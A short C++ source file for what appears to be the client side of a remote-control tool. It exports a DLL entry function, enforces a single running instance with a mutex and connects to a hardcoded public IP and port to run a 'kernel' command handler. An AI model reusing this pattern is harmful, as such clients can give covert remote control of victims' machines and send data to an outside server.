#include <stdio.h>
#include "IOCPClient.h"
#include "Kernel.h"

//#define HOST "192.168.203.130"
//#define HOST "192.168.1.2"
#define HOST  "81.68.224.152"

char szServerAddr[128] = HOST;
unsigned short Port = 10086;

extern "C" __declspec(dllexport) void HHBeginKernel(char* szServerAddr,unsigned short uPort,DWORD dwParam);

void  HHBeginKernel(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	//only one instance could be run at the same time.
	HANDLE hMutex = CreateMutex(NULL,FALSE,L"holdinghands_client");

	if(hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	{	
#ifdef _DEBUG
		MessageBox(NULL,L"An instance is already running",L"Error!",IDOK);
#endif
		return ;
	}
	/*****************Run Kernel Module****************/
	CIOCPClient::SocketInit();
	//
	CIOCPClient Client(szServerAddr,uPort, TRUE,-1,10);
	
	CKernel Handler(KNEL);
	Client.BindHandler(&Handler);

	Client.Run();

	Client.UnbindHandler();

	CIOCPClient::SocketTerm();
	
	//
	CloseHandle(hMutex);
}
